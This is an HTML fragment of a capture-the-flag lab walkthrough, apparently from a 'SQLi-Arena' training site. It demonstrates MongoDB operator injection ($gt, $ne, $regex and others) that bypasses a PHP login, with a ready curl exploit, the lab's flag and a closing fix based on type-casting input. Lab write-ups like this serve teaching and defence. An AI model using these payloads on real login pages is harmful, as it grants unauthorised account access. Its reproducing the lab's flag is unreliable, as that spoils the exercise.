<h4>Step 1: Test Normal Login</h4>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 1. Normal Login (Wrong Password)</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">POST: </span>username=admin&amp;password=wrongpass<br>
        <span class="prompt">Query: </span>db.users.findOne({"username": "admin", "password": "wrongpass"})<br><br>
        <span class="prompt">Output: </span>Invalid username or password.
    </div>
</div>

<h4>Step 2: Inject the $gt Operator</h4>
<p>
    PHP converts <code>password[$gt]=</code> into <code>$_POST['password'] = ['$gt' =&gt; '']</code>.
    In MongoDB, <code>{"$gt": ""}</code> matches any string greater than empty string --
    since all non-empty strings are "greater than" the empty string, this matches any password.
</p>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 2: $gt Operator Injection</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">POST: </span>username=admin&amp;password[$gt]=<br>
        <span class="prompt">Query: </span>db.users.findOne({"username": "admin", "password": {"$gt": ""}})<br><br>
        <span class="prompt">Output: </span>Welcome, <strong>admin</strong>! Role: admin<br>
        Admin access granted! The flag is: <strong>FLAG{mg_gt_0p3r4t0r_byp4ss}</strong>
    </div>
</div>

<h4>Step 3: Other Comparison Operators</h4>
<p>
    MongoDB supports many comparison operators that can be injected the same way:
</p>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 3. Operator Variants</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">password[$ne]= </span> -> {"$ne": ""} -- not equal to empty (Lab 1)<br>
        <span class="prompt">password[$gt]= </span> -> {"$gt": ""} -- greater than empty (this lab)<br>
        <span class="prompt">password[$gte]= </span> -> {"$gte": ""} -- greater than or equal<br>
        <span class="prompt">password[$regex]=.* </span> -> {"$regex": ".*"} -- matches everything<br>
        <span class="prompt">password[$exists]=true </span> -> {"$exists": true} -- field exists
    </div>
</div>

<h4>Step 4: Submit the Flag</h4>
<p>
    Copy the flag and paste it into the verification form:
    <code>FLAG{mg_gt_0p3r4t0r_byp4ss}</code>.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">curl. Full Exploit</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>curl -s "http://target/SQLi-Arena/mongodb/lab2" \<br>
        &nbsp;&nbsp;-d "login_submit=1&amp;username=admin&amp;password[\$gt]="
    </div>
</div>

<div class="result-success result-box">
    <strong>Key Takeaway:</strong> When <code>$ne</code> is blocked, other comparison operators like
    <code>$gt</code>, <code>$gte</code>, <code>$lt</code>, <code>$lte</code>, <code>$regex</code>,
    and <code>$exists</code> can achieve the same bypass. Blocking individual operators is insufficient --
    the defense must be type-casting input with <code>(string)$_POST['password']</code> to prevent
    any array-to-operator conversion.
</div>
